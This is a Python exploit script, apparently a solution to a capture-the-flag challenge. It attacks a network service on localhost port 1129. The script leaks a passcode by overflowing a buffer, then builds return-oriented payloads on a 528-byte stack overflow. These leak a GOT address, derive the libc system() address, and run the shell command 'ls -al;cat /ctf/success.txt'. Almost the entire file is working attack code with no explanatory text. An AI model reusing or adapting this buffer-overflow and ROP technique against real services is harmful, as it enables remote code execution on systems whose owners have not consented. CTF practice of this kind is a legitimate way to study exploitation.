from struct import *
from socket import *
from time import *

p = lambda x : pack("<L", x)
up = lambda x : unpack("<L",x)[0]

passcode = "in the end, I was there."
cmd = "ls -al;cat /ctf/success.txt"
data = 0x804b090
recv_plt = 0x80488e0
recv_got = 0x804b074
send_plt = 0x8048900
send_got = 0x804b07c
pop4ret = 0x804917c
offset = 0x188a50
#system = 0xf7563940

print "=============== [ Passcode Leak ] ==============="
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 1129))

print s.recv(1024)
print s.recv(1024)
s.send("target" + "\n")
sleep(1)

print s.recv(1024)
s.send("1.1/1.1" + "\n")
sleep(1)
print s.recv(1024)

s.send("A"*520+"\n")
sleep(1)
passcode = s.recv(1024)[542:566]

print "=============== [ Libc Leak ] ==============="

payload = "A"*528
payload += p(send_plt)
payload += p(pop4ret)
payload += p(4)
payload += p(send_got)
payload += p(4)
payload += p(0)


s.send("launch\n")
print s.recv(1024)

s.send(passcode + "\n")
print s.recv(1024)
print s.recv(1024)

s.send(payload + "\n")

got = up(s.recv(4))
print "Send_GOT : " + hex(got)
libc_base = got - 0xf390
print "Libc_base(pthread) : " + hex(libc_base)
system_libc = got - offset
print "System_libc : " + hex(system_libc)
sleep(3)
s.close()
print "=============== [ Exploit ] ==============="
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 1129))

payload = "A"*528
payload += p(recv_plt)
payload += p(pop4ret)
payload += p(4)
payload += p(data)
payload += p(len(cmd))
payload += p(0)

payload += p(system_libc)
payload += "AAAA"
payload += p(data)

print s.recv(1024)
s.send("launch\n")
print s.recv(1024)
print s.recv(1024)


s.send(passcode + "\n")
print s.recv(1024)
print s.recv(1024)

s.send(payload + "\n")
print s.recv(1024)
s.send(cmd + "\n")
print s.recv(1024)
s.close()